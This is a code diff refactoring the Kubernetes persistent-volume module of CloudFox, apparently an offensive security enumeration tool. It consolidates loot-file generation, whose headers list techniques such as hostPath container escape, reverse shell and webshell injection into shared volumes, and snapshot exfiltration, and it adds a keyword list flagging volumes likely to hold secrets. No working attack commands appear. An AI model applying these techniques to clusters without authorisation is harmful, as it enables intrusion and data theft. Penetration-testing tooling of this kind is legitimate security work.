@@ -10,6 +10,7 @@ import (
 	"github.com/BishopFox/cloudfox/globals"
 	"github.com/BishopFox/cloudfox/internal"
 	k8sinternal "github.com/BishopFox/cloudfox/internal/kubernetes"
+	"github.com/BishopFox/cloudfox/kubernetes/shared"
 	"github.com/BishopFox/cloudfox/kubernetes/config"
 	"github.com/spf13/cobra"
 	corev1 "k8s.io/api/core/v1"
@@ -242,7 +243,8 @@ type VolumeSnapshotFinding struct {
 }
 
 func ListPersistentVolumes(cmd *cobra.Command, args []string) {
-	ctx := context.Background()
+	ctx, cancel := shared.ContextWithTimeout()
+	defer cancel()
 	logger := internal.NewLogger()
 
 	parentCmd := cmd.Parent()
@@ -258,21 +260,17 @@ func ListPersistentVolumes(cmd *cobra.Command, args []string) {
 	// Get all PersistentVolumes
 	pvs, err := clientset.CoreV1().PersistentVolumes().List(ctx, metav1.ListOptions{})
 	if err != nil {
-		logger.ErrorM(fmt.Sprintf("Error listing persistent volumes: %v", err), globals.K8S_PERSISTENT_VOLUMES_MODULE_NAME)
+		shared.LogListError(&logger, "persistent volumes", "", err, globals.K8S_PERSISTENT_VOLUMES_MODULE_NAME, true)
 		return
 	}
 
 	// Get all namespaces for PVC enumeration
-	namespaces, err := clientset.CoreV1().Namespaces().List(ctx, metav1.ListOptions{})
-	if err != nil {
-		logger.ErrorM(fmt.Sprintf("Error listing namespaces: %v", err), globals.K8S_PERSISTENT_VOLUMES_MODULE_NAME)
-		return
-	}
+	namespaces := shared.GetTargetNamespaces(ctx, clientset, &logger, globals.K8S_PERSISTENT_VOLUMES_MODULE_NAME)
 
 	// Get all storage classes
 	storageClasses, err := clientset.StorageV1().StorageClasses().List(ctx, metav1.ListOptions{})
 	if err != nil {
-		logger.ErrorM(fmt.Sprintf("Error listing storage classes: %v", err), globals.K8S_PERSISTENT_VOLUMES_MODULE_NAME)
+		shared.LogListError(&logger, "storage classes", "", err, globals.K8S_PERSISTENT_VOLUMES_MODULE_NAME, false)
 	}
 
 	// Storage class map for quick lookup
@@ -284,57 +282,45 @@ func ListPersistentVolumes(cmd *cobra.Command, args []string) {
 	}
 
 	headers := []string{
-		"Risk Level",
+		// Identity
 		"PV Name",
 		"PVC",
 		"Namespace",
-		"Capacity",
+		// Specs
 		"Volume Type",
-		"HostPath Risk",
-		"Encryption",
-		"Sensitive Data",
-		"Access Modes",
-		"Bound Pods",
-		"Reclaim Policy",
+		"Capacity",
 		"Storage Class",
+		"Access Modes",
+		"Reclaim Policy",
+		// Security Flags
+		"Encrypted",
+		"HostPath",
+		"Network Storage",
+		"RWX Shared",
+		// Data
+		"Sensitive Data",
+		// Status
+		"Bound Pods",
 		"Orphaned",
-		"Escalation Paths",
-		"Security Issues",
 		"Age",
-		"Recommendations",
 	}
 
 	var outputRows [][]string
 	var findings []PersistentVolumeFinding
 
-	// Loot file contents
-	var lootEnum []string
-	var lootHostPath []string
-	var lootEscalation []string
-	var lootUnencrypted []string
-	var lootExfiltration []string
-	var lootNetworkStorage []string
-	var lootReclaimPolicy []string
-	var lootReadWriteMany []string
-	var lootOrphaned []string
-	var lootCloudAccess []string
-	var lootDataAccess []string
-	var lootSnapshots []string
-	var lootAttackPaths []string
-	var lootMisconfigurations []string
-	var lootRemediation []string
+	// Initialize loot builder
+	loot := shared.NewLootBuilder()
 
-	// Initialize loot headers
-	lootEnum = append(lootEnum, `#####################################
+	// Initialize loot sections by technology type (7 sections)
+	loot.Section("PV-Enum").SetHeader(`#####################################
 ##### PersistentVolume Enumeration
 #####################################
 #
-# Enumerate storage resources
-#
-`)
+# General enumeration commands for all storage resources
+#`)
 
-	lootHostPath = append(lootHostPath, `#####################################
-##### HostPath Volume Security
+	loot.Section("PV-HostPath").SetHeader(`#####################################
+##### HostPath Volumes
 #####################################
 #
 # CRITICAL: HostPath volumes provide direct host filesystem access
@@ -342,125 +328,85 @@ func ListPersistentVolumes(cmd *cobra.Command, args []string) {
 #
 # IMPACT: Full node compromise, cluster takeover
 #
-`)
+# Techniques included:
+# - Container escape via PVC
+# - Direct hostPath pod creation
+# - Path-specific exploitation (docker.sock, kubelet, etc.)
+# - Credential theft and persistence
+#`)
 
-	lootEscalation = append(lootEscalation, `#####################################
-##### Privilege Escalation via Storage
+	loot.Section("PV-NFS").SetHeader(`#####################################
+##### NFS/Network Storage Volumes
 #####################################
 #
-# Storage-based privilege escalation paths
-# Complete attack chains from initial access to cluster compromise
+# NFS and network-attached storage volumes
+# Risk: Direct mount bypasses Kubernetes RBAC and audit logs
 #
-`)
+# Techniques included:
+# - Direct NFS mount from attacker machine
+# - Data exfiltration via direct access
+# - Data tampering (if read-write)
+# - Pod-based NFS access
+#`)
 
-	lootUnencrypted = append(lootUnencrypted, `#####################################
-##### Unencrypted Sensitive Data
+	loot.Section("PV-RWX").SetHeader(`#####################################
+##### ReadWriteMany (RWX) Volumes
 #####################################
 #
-# Volumes containing sensitive data without encryption
-# Risk: Data exposure if volume accessed or snapshots taken
+# Volumes shared across multiple pods (lateral movement vector)
+# Risk: Compromise one pod → access all pods sharing the volume
 #
-`)
+# Techniques included:
+# - Reverse shell injection
+# - Config file poisoning
+# - Webshell deployment
+# - Cron/startup script injection
+# - SSH key injection
+# - Symlink attacks
+# - Application-specific attacks
+#`)
 
-	lootExfiltration = append(lootExfiltration, `#####################################
-##### Data Exfiltration via Snapshots
+	loot.Section("PV-Cloud").SetHeader(`#####################################
+##### Cloud Provider Volumes
 #####################################
 #
-# Snapshot-based data exfiltration techniques
-# Create snapshots, restore to new PVC, exfiltrate data
-#
-`)
-
-	lootNetworkStorage = append(lootNetworkStorage, `#####################################
-##### Network Storage Security
-#####################################
-#
-# NFS/iSCSI volumes with authentication issues
-# Risk: Direct network access without Kubernetes RBAC
-#
-`)
-
-	lootReclaimPolicy = append(lootReclaimPolicy, `#####################################
-##### Reclaim Policy - Data Leakage Risk
-#####################################
-#
-# Volumes with "Retain" policy persist after PVC deletion
-# Risk: Previous tenant data may be accessible
-#
-`)
-
-	lootReadWriteMany = append(lootReadWriteMany, `#####################################
-##### ReadWriteMany Shared Volumes
-#####################################
-#
-# Volumes shared across multiple pods
-# Risk: Lateral movement, data corruption, race conditions
-#
-`)
-
-	lootOrphaned = append(lootOrphaned, `#####################################
-##### Orphaned and Unused Volumes
-#####################################
-#
-# Released or unbound volumes that may contain old data
-# Risk: Data leakage if reclaimed by another tenant
-#
-`)
-
-	lootCloudAccess = append(lootCloudAccess, `#####################################
-##### Cloud Volume Direct Access
-#####################################
-#
-# Access cloud provider volumes directly (bypass Kubernetes)
+# AWS EBS, GCE PD, Azure Disk direct access
 # REQUIRES: Cloud provider CLI tools and credentials
 #
-`)
+# Techniques included:
+# - Volume inspection
+# - Snapshot creation for exfiltration
+# - Cross-account/cross-project access
+#`)
 
-	lootDataAccess = append(lootDataAccess, `#####################################
-##### Data Access via Inspector Pods
-#####################################
-#
-# Access PVC data by creating temporary inspector pods
-# MANUAL EXECUTION REQUIRED
-#
-`)
-
-	lootSnapshots = append(lootSnapshots, `#####################################
+	loot.Section("PV-Snapshots").SetHeader(`#####################################
 ##### Volume Snapshots
 #####################################
 #
-# Enumerate VolumeSnapshots for data exfiltration assessment
-# Snapshots can be used to copy sensitive data
+# VolumeSnapshot enumeration and exploitation
+# Risk: Clone sensitive data without accessing original volume
 #
-`)
+# Techniques included:
+# - Snapshot enumeration
+# - PVC restoration from snapshots
+# - Data exfiltration via snapshot clone
+#`)
 
-	lootAttackPaths = append(lootAttackPaths, `#####################################
-##### Complete Attack Paths
+	loot.Section("PV-Orphaned").SetHeader(`#####################################
+##### Orphaned & Retain Policy Volumes
 #####################################
 #
-# End-to-end attack chains via persistent volumes
-# From initial access to cluster compromise
+# Released/unbound volumes and Retain policy risks
+# Risk: Access previous tenant data, data leakage after deletion
 #
-`)
-
-	lootMisconfigurations = append(lootMisconfigurations, `#####################################
-##### Storage Misconfigurations
-#####################################
-#
-# Security misconfigurations in storage resources
-#
-`)
-
-	lootRemediation = append(lootRemediation, `#####################################
-##### Remediation Recommendations
-#####################################
-#
-# Security hardening recommendations for storage
-#
-`)
+# Techniques included:
+# - Reclaim orphaned volumes
+# - Access released volume data
+# - Retain policy exploitation
+#`)
 
 	if globals.KubeContext != "" {
-		lootEnum = append(lootEnum, fmt.Sprintf("kubectl config use-context %s\n", globals.ClusterName))
+		loot.Section("PV-Enum").Addf("kubectl config use-context %s\n", globals.ClusterName)
 	}
 
 	// Map to track which pods use which PVCs
@@ -468,15 +414,15 @@ func ListPersistentVolumes(cmd *cobra.Command, args []string) {
 	pvcToPodsNamespaces := make(map[string][]string)
 
 	// Get all pods across all namespaces to map PVC usage
-	for _, ns := range namespaces.Items {
-		pods, err := clientset.CoreV1().Pods(ns.Name).List(ctx, metav1.ListOptions{})
+	for _, ns := range namespaces {
+		pods, err := clientset.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{})
 		if err == nil {
 			for _, pod := range pods.Items {
 				for _, volume := range pod.Spec.Volumes {
 					if volume.PersistentVolumeClaim != nil {
-						key := fmt.Sprintf("%s/%s", ns.Name, volume.PersistentVolumeClaim.ClaimName)
+						key := fmt.Sprintf("%s/%s", ns, volume.PersistentVolumeClaim.ClaimName)
 						pvcToPods[key] = append(pvcToPods[key], pod.Name)
-						pvcToPodsNamespaces[key] = append(pvcToPodsNamespaces[key], ns.Name)
+						pvcToPodsNamespaces[key] = append(pvcToPodsNamespaces[key], ns)
 					}
 				}
 			}
@@ -573,7 +519,7 @@ func ListPersistentVolumes(cmd *cobra.Command, args []string) {
 		finding.CloudProvider = encryptionAnalysis.Provider
 		finding.SecurityIssues = append(finding.SecurityIssues, encryptionAnalysis.SecurityIssues...)
 		if !encryptionAnalysis.IsEncrypted && sensitiveDataAnalysis.ContainsSensitiveData {
-			finding.UnencryptedDataRisk = "HIGH"
+			finding.UnencryptedDataRisk = shared.RiskHigh
 		}
 
 		// Reclaim Policy Analysis
@@ -649,9 +595,50 @@ func ListPersistentVolumes(cmd *cobra.Command, args []string) {
 			orphanedStr = "Unbound"
 		}
 
-		encryptionStr := "No"
+		encryptedStr := "No"
 		if finding.IsEncrypted {
-			encryptionStr = "Yes"
+			encryptedStr = "Yes"
+		}
+
+		// HostPath - show actual path instead of Yes/No
+		hostPathStr := "<NONE>"
+		if finding.IsHostPath {
+			hostPathStr = finding.HostPathPath
+		}
+
+		// Network Storage - show mount point instead of Yes/No
+		networkStorageStr := "<NONE>"
+		if finding.IsNetworkStorage && finding.NFSServer != "" {
+			networkStorageStr = fmt.Sprintf("%s:%s", finding.NFSServer, finding.NFSPath)
+		}
+
+		// RWX Shared - show detailed sharing info with namespaces
+		// RWX = ReadWriteMany access mode (volume can be mounted read-write by many nodes)
+		// This is a lateral movement risk: compromise one pod → access all shared data
+		rwxSharedStr := "<NONE>"
+		if finding.AllowsReadWriteMany {
+			if finding.BoundPodCount > 1 {
+				// Show pod count and namespace info for lateral movement assessment
+				if len(finding.BoundNamespaces) > 1 {
+					// Cross-namespace sharing = higher lateral movement risk
+					rwxSharedStr = fmt.Sprintf("%d pods across %s", finding.BoundPodCount, strings.Join(finding.BoundNamespaces, ", "))
+				} else if len(finding.BoundNamespaces) == 1 {
+					// Single namespace sharing
+					rwxSharedStr = fmt.Sprintf("%d pods in %s", finding.BoundPodCount, finding.BoundNamespaces[0])
+				} else {
+					rwxSharedStr = fmt.Sprintf("%d pods", finding.BoundPodCount)
+				}
+			} else if finding.BoundPodCount == 1 {
+				// Single pod but RWX capable - potential future risk
+				if len(finding.BoundNamespaces) == 1 {
+					rwxSharedStr = fmt.Sprintf("1 pod in %s", finding.BoundNamespaces[0])
+				} else {
+					rwxSharedStr = "1 pod"
+				}
+			} else {
+				// RWX enabled but no pods bound - available for lateral movement if claimed
+				rwxSharedStr = "RWX (unbound)"
+			}
 		}
 
 		pvcStr := "<NONE>"
@@ -669,41 +656,46 @@ func ListPersistentVolumes(cmd *cobra.Command, args []string) {
 			sensitiveDataStr = finding.SensitiveDataType
 		}
 
+		// Bound Pods - show actual pod names instead of count
+		boundPodsStr := "<NONE>"
+		if len(finding.BoundPods) > 0 {
+			boundPodsStr = strings.Join(finding.BoundPods, ", ")
+		}
+
 		outputRows = append(outputRows, []string{
-			finding.RiskLevel,
+			// Identity
 			finding.PVName,
 			pvcStr,
 			namespaceStr,
-			finding.Capacity,
+			// Specs
 			finding.VolumeType,
-			finding.HostPathRisk,
-			encryptionStr,
-			sensitiveDataStr,
-			strings.Join(finding.AccessModes, ","),
-			fmt.Sprintf("%d", finding.BoundPodCount),
-			finding.ReclaimPolicy,
+			finding.Capacity,
 			finding.StorageClass,
+			strings.Join(finding.AccessModes, ","),
+			finding.ReclaimPolicy,
+			// Security Flags
+			encryptedStr,
+			hostPathStr,
+			networkStorageStr,
+			rwxSharedStr,
+			// Data
+			sensitiveDataStr,
+			// Status
+			boundPodsStr,
 			orphanedStr,
-			fmt.Sprintf("%d", len(finding.EscalationPaths)),
-			fmt.Sprintf("%d", len(finding.SecurityIssues)),
 			finding.Age,
-			fmt.Sprintf("%d", len(finding.Recommendations)),
 		})
 
 		// Generate loot content
-		generateLootContent(&finding, &lootEnum, &lootHostPath, &lootEscalation, &lootUnencrypted,
-			&lootExfiltration, &lootNetworkStorage, &lootReclaimPolicy, &lootReadWriteMany,
-			&lootOrphaned, &lootCloudAccess, &lootDataAccess, &lootAttackPaths,
-			&lootMisconfigurations, &lootRemediation)
+		generateLootContent(&finding, loot)
 	}
 
 	// Enumerate volume snapshots
-	generateSnapshotLoot(ctx, clientset, &lootSnapshots)
+	generateSnapshotLoot(ctx, clientset, loot)
 
-	// Sort by risk level
+	// Sort by PV name
 	sort.SliceStable(outputRows, func(i, j int) bool {
-		riskOrder := map[string]int{"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
-		return riskOrder[outputRows[i][0]] < riskOrder[outputRows[j][0]]
+		return outputRows[i][0] < outputRows[j][0]
 	})
 
 	table := internal.TableFile{
@@ -712,68 +704,7 @@ func ListPersistentVolumes(cmd *cobra.Command, args []string) {
 		Body:   outputRows,
 	}
 
-	lootFiles := []internal.LootFile{
-		{
-			Name:     "PV-PVC-Enum",
-			Contents: strings.Join(lootEnum, "\n"),
-		},
-		{
-			Name:     "PV-HostPath-Volumes",
-			Contents: strings.Join(lootHostPath, "\n"),
-		},
-		{
-			Name:     "PV-Privilege-Escalation",
-			Contents: strings.Join(lootEscalation, "\n"),
-		},
-		{
-			Name:     "PV-Unencrypted-Sensitive",
-			Contents: strings.Join(lootUnencrypted, "\n"),
-		},
-		{
-			Name:     "PV-Data-Exfiltration",
-			Contents: strings.Join(lootExfiltration, "\n"),
-		},
-		{
-			Name:     "PV-Network-Storage",
-			Contents: strings.Join(lootNetworkStorage, "\n"),
-		},
-		{
-			Name:     "PV-Reclaim-Policy",
-			Contents: strings.Join(lootReclaimPolicy, "\n"),
-		},
-		{
-			Name:     "PV-ReadWriteMany",
-			Contents: strings.Join(lootReadWriteMany, "\n"),
-		},
-		{
-			Name:     "PV-Orphaned-Volumes",
-			Contents: strings.Join(lootOrphaned, "\n"),
-		},
-		{
-			Name:     "PV-Cloud-Access",
-			Contents: strings.Join(lootCloudAccess, "\n"),
-		},
-		{
-			Name:     "PVC-Data-Access",
-			Contents: strings.Join(lootDataAccess, "\n"),
-		},
-		{
-			Name:     "PV-VolumeSnapshots",
-			Contents: strings.Join(lootSnapshots, "\n"),
-		},
-		{
-			Name:     "PV-Attack-Paths",
-			Contents: strings.Join(lootAttackPaths, "\n"),
-		},
-		{
-			Name:     "PV-Misconfigurations",
-			Contents: strings.Join(lootMisconfigurations, "\n"),
-		},
-		{
-			Name:     "PV-Remediation",
-			Contents: strings.Join(lootRemediation, "\n"),
-		},
-	}
+	lootFiles := loot.Build()
 
 	err = internal.HandleOutput(
 		"Kubernetes",
@@ -794,17 +725,20 @@ func ListPersistentVolumes(cmd *cobra.Command, args []string) {
 		return
 	}
 
-	if len(outputRows) > 0 {
-		criticalCount := 0
-		highCount := 0
-		for _, row := range outputRows {
-			if row[0] == "CRITICAL" {
-				criticalCount++
-			} else if row[0] == "HIGH" {
-				highCount++
-			}
+	// Count security-relevant volumes
+	hostPathCount := 0
+	networkStorageCount := 0
+	for _, f := range findings {
+		if f.IsHostPath {
+			hostPathCount++
 		}
-		logger.InfoM(fmt.Sprintf("%d volumes found (%d CRITICAL, %d HIGH risk)", len(outputRows), criticalCount, highCount), globals.K8S_PERSISTENT_VOLUMES_MODULE_NAME)
+		if f.IsNetworkStorage {
+			networkStorageCount++
+		}
+	}
+
+	if len(outputRows) > 0 {
+		logger.InfoM(fmt.Sprintf("%d volumes found (%d HostPath, %d Network Storage)", len(outputRows), hostPathCount, networkStorageCount), globals.K8S_PERSISTENT_VOLUMES_MODULE_NAME)
 	} else {
 		logger.InfoM("No persistent volumes found, skipping output file creation", globals.K8S_PERSISTENT_VOLUMES_MODULE_NAME)
 	}
@@ -827,7 +761,7 @@ func analyzeHostPathSecurity(pv corev1.PersistentVolume) HostPathAnalysis {
 	if pv.Spec.HostPath.Type != nil {
 		analysis.Type = string(*pv.Spec.HostPath.Type)
 	}
-	analysis.RiskLevel = "HIGH"
+	analysis.RiskLevel = shared.RiskHigh
 
 	// Check dangerous paths
 	dangerousPaths := map[string]string{
@@ -854,8 +788,8 @@ func analyzeHostPathSecurity(pv corev1.PersistentVolume) HostPathAnalysis {
 		if strings.HasPrefix(analysis.Path, path) || analysis.Path == path {
 			analysis.DangerousPath = true
 			analysis.DangerousPathReason = risk
-			if strings.Contains(risk, "CRITICAL") {
-				analysis.RiskLevel = "CRITICAL"
+			if strings.Contains(risk, shared.RiskCritical) {
+				analysis.RiskLevel = shared.RiskCritical
 			}
 			break
 		}
@@ -898,7 +832,7 @@ func analyzeHostPathSecurity(pv corev1.PersistentVolume) HostPathAnalysis {
 func detectSensitiveData(pv corev1.PersistentVolume, pvcName, storageClass string) SensitiveDataAnalysis {
 	analysis := SensitiveDataAnalysis{
 		ContainsSensitiveData: false,
-		RiskLevel:             "LOW",
+		RiskLevel:             shared.RiskLow,
 	}
 
 	patterns := []struct {
@@ -907,27 +841,27 @@ func detectSensitiveData(pv corev1.PersistentVolume, pvcName, storageClass strin
 		Severity    string
 		Description string
 	}{
-		{"mysql", "Database", "HIGH", "MySQL database data"},
-		{"postgres", "Database", "HIGH", "PostgreSQL database data"},
-		{"mongodb", "Database", "HIGH", "MongoDB database data"},
-		{"mariadb", "Database", "HIGH", "MariaDB database data"},
-		{"redis", "Cache", "MEDIUM", "Redis cache (may contain session tokens)"},
-		{"elasticsearch", "Search", "MEDIUM", "Elasticsearch indexed data"},
-		{"backup", "Backup", "HIGH", "Backup data (may contain full system state)"},
-		{"etcd", "Secrets", "CRITICAL", "etcd data (all cluster secrets)"},
-		{"secret", "Secrets", "CRITICAL", "Likely contains secrets"},
-		{"config", "Config", "MEDIUM", "Configuration files"},
-		{"log", "Logs", "LOW", "Log files (may leak sensitive info)"},
-		{"database", "Database", "HIGH", "Database storage"},
-		{"db", "Database", "HIGH", "Database storage"},
-		{"vault", "Secrets", "CRITICAL", "HashiCorp Vault data"},
-		{"credential", "Secrets", "CRITICAL", "Credentials storage"},
-		{"password", "Secrets", "CRITICAL", "Password storage"},
-		{"ssh", "Credentials", "HIGH", "SSH keys"},
-		{"ssl", "Certificates", "HIGH", "SSL/TLS certificates"},
-		{"tls", "Certificates", "HIGH", "TLS certificates"},
-		{"cert", "Certificates", "HIGH", "Certificates"},
-		{"key", "Secrets", "HIGH", "Cryptographic keys"},
+		{"mysql", "Database", shared.RiskHigh, "MySQL database data"},
+		{"postgres", "Database", shared.RiskHigh, "PostgreSQL database data"},
+		{"mongodb", "Database", shared.RiskHigh, "MongoDB database data"},
+		{"mariadb", "Database", shared.RiskHigh, "MariaDB database data"},
+		{"redis", "Cache", shared.RiskMedium, "Redis cache (may contain session tokens)"},
+		{"elasticsearch", "Search", shared.RiskMedium, "Elasticsearch indexed data"},
+		{"backup", "Backup", shared.RiskHigh, "Backup data (may contain full system state)"},
+		{"etcd", "Secrets", shared.RiskCritical, "etcd data (all cluster secrets)"},
+		{"secret", "Secrets", shared.RiskCritical, "Likely contains secrets"},
+		{"config", "Config", shared.RiskMedium, "Configuration files"},
+		{"log", "Logs", shared.RiskLow, "Log files (may leak sensitive info)"},
+		{"database", "Database", shared.RiskHigh, "Database storage"},
+		{"db", "Database", shared.RiskHigh, "Database storage"},
+		{"vault", "Secrets", shared.RiskCritical, "HashiCorp Vault data"},
+		{"credential", "Secrets", shared.RiskCritical, "Credentials storage"},
+		{"password", "Secrets", shared.RiskCritical, "Password storage"},
+		{"ssh", "Credentials", shared.RiskHigh, "SSH keys"},
+		{"ssl", "Certificates", shared.RiskHigh, "SSL/TLS certificates"},
+		{"tls", "Certificates", shared.RiskHigh, "TLS certificates"},
+		{"cert", "Certificates", shared.RiskHigh, "Certificates"},
+		{"key", "Secrets", shared.RiskHigh, "Cryptographic keys"},
 	}
 
 	checkStrings := []string{
@@ -946,15 +880,15 @@ func detectSensitiveData(pv corev1.PersistentVolume, pvcName, storageClass strin
 					fmt.Sprintf("%s: %s", pattern.Type, pattern.Description))
 
 				switch pattern.Severity {
-				case "CRITICAL":
-					analysis.RiskLevel = "CRITICAL"
-				case "HIGH":
-					if analysis.RiskLevel != "CRITICAL" {
-						analysis.RiskLevel = "HIGH"
+				case shared.RiskCritical:
+					analysis.RiskLevel = shared.RiskCritical
+				case shared.RiskHigh:
+					if analysis.RiskLevel != shared.RiskCritical {
+						analysis.RiskLevel = shared.RiskHigh
 					}
-				case "MEDIUM":
-					if analysis.RiskLevel != "CRITICAL" && analysis.RiskLevel != "HIGH" {
-						analysis.RiskLevel = "MEDIUM"
+				case shared.RiskMedium:
+					if analysis.RiskLevel != shared.RiskCritical && analysis.RiskLevel != shared.RiskHigh {
+						analysis.RiskLevel = shared.RiskMedium
 					}
 				}
 				break
@@ -969,7 +903,7 @@ func detectSensitiveData(pv corev1.PersistentVolume, pvcName, storageClass strin
 func analyzeEncryption(pv corev1.PersistentVolume) EncryptionAnalysis {
 	analysis := EncryptionAnalysis{
 		IsEncrypted: false,
-		RiskLevel:   "MEDIUM",
+		RiskLevel:   shared.RiskMedium,
 	}
 
 	// AWS EBS
@@ -1000,13 +934,13 @@ func analyzeEncryption(pv corev1.PersistentVolume) EncryptionAnalysis {
 		if encrypted, ok := pv.Spec.CSI.VolumeAttributes["encrypted"]; ok && encrypted == "true" {
 			analysis.IsEncrypted = true
 			analysis.EncryptionType = "CSI Driver Encryption"
-			analysis.RiskLevel = "LOW"
+			analysis.RiskLevel = shared.RiskLow
 		}
 		if key, ok := pv.Spec.CSI.VolumeAttributes["encryptionKMSKeyId"]; ok {
 			analysis.IsEncrypted = true
 			analysis.KMSKeyID = key
 			analysis.EncryptionType = "KMS"
-			analysis.RiskLevel = "LOW"
+			analysis.RiskLevel = shared.RiskLow
 		}
 		if !analysis.IsEncrypted {
 			analysis.SecurityIssues = append(analysis.SecurityIssues,
@@ -1019,14 +953,14 @@ func analyzeEncryption(pv corev1.PersistentVolume) EncryptionAnalysis {
 		analysis.Provider = "HostPath"
 		analysis.SecurityIssues = append(analysis.SecurityIssues,
 			"HostPath volumes are not encrypted (uses host filesystem)")
-		analysis.RiskLevel = "HIGH"
+		analysis.RiskLevel = shared.RiskHigh
 	}
 
 	if pv.Spec.NFS != nil {
 		analysis.Provider = "NFS"
 		analysis.SecurityIssues = append(analysis.SecurityIssues,
 			"NFS volumes typically not encrypted in transit or at rest")
-		analysis.RiskLevel = "HIGH"
+		analysis.RiskLevel = shared.RiskHigh
 	}
 
 	return analysis
@@ -1039,12 +973,12 @@ func analyzeReclaimPolicy(pv corev1.PersistentVolume) ReclaimPolicyAnalysis {
 	analysis := ReclaimPolicyAnalysis{
 		Policy:          policy,
 		DataLeakageRisk: false,
-		RiskLevel:       "LOW",
+		RiskLevel:       shared.RiskLow,
 	}
 
 	switch policy {
 	case "Retain":
-		analysis.RiskLevel = "HIGH"
+		analysis.RiskLevel = shared.RiskHigh
 		analysis.DataLeakageRisk = true
 		analysis.Issues = append(analysis.Issues,
 			"Volume will persist after PVC deletion",
@@ -1052,17 +986,17 @@ func analyzeReclaimPolicy(pv corev1.PersistentVolume) ReclaimPolicyAnalysis {
 			"Manual cleanup required to prevent data leakage",
 		)
 	case "Recycle":
-		analysis.RiskLevel = "MEDIUM"
+		analysis.RiskLevel = shared.RiskMedium
 		analysis.Issues = append(analysis.Issues,
 			"Recycle policy is deprecated",
 			"Basic scrub may leave data remnants",
 			"Use Delete policy instead",
 		)
 	case "Delete":
-		analysis.RiskLevel = "LOW"
+		analysis.RiskLevel = shared.RiskLow
 		// This is the secure option
 	default:
-		analysis.RiskLevel = "MEDIUM"
+		analysis.RiskLevel = shared.RiskMedium
 		analysis.Issues = append(analysis.Issues, "Unknown reclaim policy: "+policy)
 	}
 
@@ -1074,7 +1008,7 @@ func analyzeAccessModes(pv corev1.PersistentVolume, boundPods []string) AccessMo
 	analysis := AccessModeAnalysis{
 		Modes:         pv.Spec.AccessModes,
 		BoundPodCount: len(boundPods),
-		RiskLevel:     "LOW",
+		RiskLevel:     shared.RiskLow,
 	}
 
 	hasRWX := false
@@ -1087,7 +1021,7 @@ func analyzeAccessModes(pv corev1.PersistentVolume, boundPods []string) AccessMo
 
 	if hasRWX {
 		if len(boundPods) > 1 {
-			analysis.RiskLevel = "HIGH"
+			analysis.RiskLevel = shared.RiskHigh
 			analysis.Issues = append(analysis.Issues,
 				fmt.Sprintf("ReadWriteMany volume accessed by %d pods", len(boundPods)),
 				"Risk of data corruption from concurrent writes",
@@ -1095,13 +1029,13 @@ func analyzeAccessModes(pv corev1.PersistentVolume, boundPods []string) AccessMo
 				"No access control between pods sharing volume",
 			)
 		} else if len(boundPods) == 1 {
-			analysis.RiskLevel = "MEDIUM"
+			analysis.RiskLevel = shared.RiskMedium
 			analysis.Issues = append(analysis.Issues,
 				"ReadWriteMany allows multi-pod access (currently 1 pod)",
 				"Potential lateral movement vector if more pods added",
 			)
 		} else {
-			analysis.RiskLevel = "MEDIUM"
+			analysis.RiskLevel = shared.RiskMedium
 			analysis.Issues = append(analysis.Issues,
 				"ReadWriteMany capability available (no pods currently bound)",
 			)
@@ -1115,7 +1049,7 @@ func analyzeAccessModes(pv corev1.PersistentVolume, boundPods []string) AccessMo
 func analyzeNFSSecurity(pv corev1.PersistentVolume) NFSSecurityAnalysis {
 	analysis := NFSSecurityAnalysis{
 		NoAuth:    true, // NFS typically has no authentication
-		RiskLevel: "MEDIUM",
+		RiskLevel: shared.RiskMedium,
 	}
 
 	if pv.Spec.NFS == nil {
@@ -1125,7 +1059,7 @@ func analyzeNFSSecurity(pv corev1.PersistentVolume) NFSSecurityAnalysis {
 	analysis.Server = pv.Spec.NFS.Server
 	analysis.Path = pv.Spec.NFS.Path
 	analysis.ReadOnly = pv.Spec.NFS.ReadOnly
-	analysis.RiskLevel = "HIGH"
+	analysis.RiskLevel = shared.RiskHigh
 
 	analysis.Issues = append(analysis.Issues,
 		"NFS typically has no authentication",
@@ -1136,7 +1070,7 @@ func analyzeNFSSecurity(pv corev1.PersistentVolume) NFSSecurityAnalysis {
 	)
 
 	if !analysis.ReadOnly {
-		analysis.RiskLevel = "CRITICAL"
+		analysis.RiskLevel = shared.RiskCritical
 		analysis.Issues = append(analysis.Issues,
 			"Read-write NFS export - data tampering possible",
 			"Attacker with network access can modify data directly",
@@ -1149,7 +1083,7 @@ func analyzeNFSSecurity(pv corev1.PersistentVolume) NFSSecurityAnalysis {
 // analyzeCSISecurity analyzes CSI driver security
 func analyzeCSISecurity(pv corev1.PersistentVolume) CSISecurityAnalysis {
 	analysis := CSISecurityAnalysis{
-		RiskLevel: "LOW",
+		RiskLevel: shared.RiskLow,
 	}
 
 	if pv.Spec.CSI == nil {
@@ -1172,7 +1106,7 @@ func analyzeCSISecurity(pv corev1.PersistentVolume) CSISecurityAnalysis {
 	for pattern, vuln := range vulnerableDrivers {
 		if strings.Contains(analysis.Driver, pattern) {
 			analysis.KnownVulnerability = vuln
-			analysis.RiskLevel = "MEDIUM"
+			analysis.RiskLevel = shared.RiskMedium
 			analysis.SecurityIssues = append(analysis.SecurityIssues, vuln)
 		}
 	}
@@ -1195,7 +1129,7 @@ func analyzeStorageClassSecurity(sc storagev1.StorageClass) StorageClassAnalysis
 		Provisioner:          sc.Provisioner,
 		AllowVolumeExpansion: sc.AllowVolumeExpansion != nil && *sc.AllowVolumeExpansion,
 		Parameters:           sc.Parameters,
-		RiskLevel:            "LOW",
+		RiskLevel:            shared.RiskLow,
 	}
 
 	if sc.VolumeBindingMode != nil {
@@ -1207,7 +1141,7 @@ func analyzeStorageClassSecurity(sc storagev1.StorageClass) StorageClassAnalysis
 		if *sc.ReclaimPolicy == corev1.PersistentVolumeReclaimRetain {
 			analysis.SecurityIssues = append(analysis.SecurityIssues,
 				"Reclaim policy 'Retain' - volumes persist after deletion (data leakage risk)")
-			analysis.RiskLevel = "MEDIUM"
+			analysis.RiskLevel = shared.RiskMedium
 		}
 	}
 
@@ -1217,14 +1151,14 @@ func analyzeStorageClassSecurity(sc storagev1.StorageClass) StorageClassAnalysis
 		analysis.AllowsPrivilegedAccess = true
 		analysis.SecurityIssues = append(analysis.SecurityIssues,
 			"CRITICAL: HostPath provisioner allows direct host filesystem access")
-		analysis.RiskLevel = "CRITICAL"
+		analysis.RiskLevel = shared.RiskCritical
 	}
 
 	// Check for local volume provisioner
 	if strings.Contains(strings.ToLower(sc.Provisioner), "local") {
 		analysis.SecurityIssues = append(analysis.SecurityIssues,
 			"Local volume provisioner - verify node security")
